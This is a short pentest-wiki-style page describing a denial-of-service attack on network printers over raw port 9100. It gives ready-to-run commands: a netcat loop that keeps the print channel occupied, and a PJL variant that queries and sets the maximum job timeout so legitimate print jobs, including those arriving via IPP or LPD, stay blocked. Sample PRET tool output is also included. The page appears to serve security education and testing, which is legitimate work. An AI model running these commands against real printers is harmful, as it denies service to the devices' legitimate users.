# Transmission channel

If print jobs are processed in series – which is assumed for most devices – only one job can be handled at a time. If this job does not terminate the printing channel effectively is blocked until a timeout is triggered, preventing legitimate users from printing. 

Basic DoS:

```bash
while true; do nc printer 9100; done
```

This trivial denial of service attack can be improved by **setting a high timeout value with PJL**, then the number of connections for an attacker to make is minimized while it is even harder for legitimate users to gain a free time slot:

```bash
# get maximum timeout value with PJL
MAX="`echo "@PJL INFO VARIABLES" | nc -w3 printer 9100 |\
  grep -E -A2 '^TIMEOUT=' | tail -n1 | awk '{print $1}'`"
# connect and set maximum timeout for current job with PJL
while true; do echo "@PJL SET TIMEOUT=$MAX" | nc printer 9100; done
```

You can use [PRET](https://github.com/RUB-NDS/PRET) to find the timeout settings:

```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> env timeout
TIMEOUT=15 [2 RANGE]
       5
       300
```

While the PJL reference specifies a maximum timeout of 300 seconds, in practice maximum PJL timeouts may range from 15 to 2147483 seconds.  
Note that even print jobs received from other printing channels like IPP or LPD are not processed anymore as long as the connection is kept open.

**Learn more about this attack in** [**http://hacking-printers.net/wiki/index.php/Transmission\_channel**](http://hacking-printers.net/wiki/index.php/Transmission_channel)\*\*\*\*

